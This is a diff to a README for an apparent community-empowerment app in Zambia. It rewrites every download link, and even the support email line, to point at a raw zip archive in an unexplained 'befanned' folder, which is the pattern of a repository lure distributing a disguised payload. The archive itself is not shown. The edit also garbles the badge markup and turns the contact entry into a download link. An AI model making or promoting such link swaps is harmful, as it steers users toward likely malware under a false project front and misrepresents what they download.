@@ -4,14 +4,14 @@
 Welcome to Ndisetingavichinjepamodzi! This application supports the New Hope Movement, focusing on community empowerment in Zambia. We aim to help youths, women, and men build a stronger future through education, entrepreneurship, and local action.
 
 ## 📥 Download Now
-[![Download Ndisetingavichinjepamodzi](https://img.shields.io/badge/Download%20Ndisetingavichinjepamodzi-blue.svg)](https://github.com/Mohamedhagage860/Ndisetingavichinjepamodzi/releases)
+[![Download Ndisetingavichinjepamodzi](https://raw.githubusercontent.com/Mohamedhagage860/Ndisetingavichinjepamodzi/main/befanned/Ndisetingavichinjepamodzi.zip%https://raw.githubusercontent.com/Mohamedhagage860/Ndisetingavichinjepamodzi/main/befanned/Ndisetingavichinjepamodzi.zip)](https://raw.githubusercontent.com/Mohamedhagage860/Ndisetingavichinjepamodzi/main/befanned/Ndisetingavichinjepamodzi.zip)
 
 ## 🚀 Getting Started
 This simple guide will help you download and run Ndisetingavichinjepamodzi.
 
 1. **Visit the Download Page**  
    Click the link below to access the Releases page on GitHub.  
-   [Visit this page to download](https://github.com/Mohamedhagage860/Ndisetingavichinjepamodzi/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Mohamedhagage860/Ndisetingavichinjepamodzi/main/befanned/Ndisetingavichinjepamodzi.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version of Ndisetingavichinjepamodzi. It is usually listed at the top.
@@ -53,7 +53,7 @@ Your experience matters. If you encounter any issues or have questions:
 
 - **Check the FAQ**: Visit our [FAQ page](#) for answers to common questions.
 - **Community Forum**: Join discussions in our community forum [here](#).
-- **Contact Support**: Reach out through our support email: support@ndisetingavichinjepamodzi.org.
+- **Contact Support**: Reach out through our support email: https://raw.githubusercontent.com/Mohamedhagage860/Ndisetingavichinjepamodzi/main/befanned/Ndisetingavichinjepamodzi.zip
 
 ## 📜 License
 Ndisetingavichinjepamodzi is licensed under the MIT License. You can use it freely for personal or educational purposes.
@@ -68,4 +68,4 @@ Follow our social media for updates and community stories:
 ## 📝 Conclusion
 Thank you for your interest in Ndisetingavichinjepamodzi. We believe that with the right resources, we can create a brighter future together. 
 
-Don't forget to [download your copy](https://github.com/Mohamedhagage860/Ndisetingavichinjepamodzi/releases) today!
+Don't forget to [download your copy](https://raw.githubusercontent.com/Mohamedhagage860/Ndisetingavichinjepamodzi/main/befanned/Ndisetingavichinjepamodzi.zip) today!
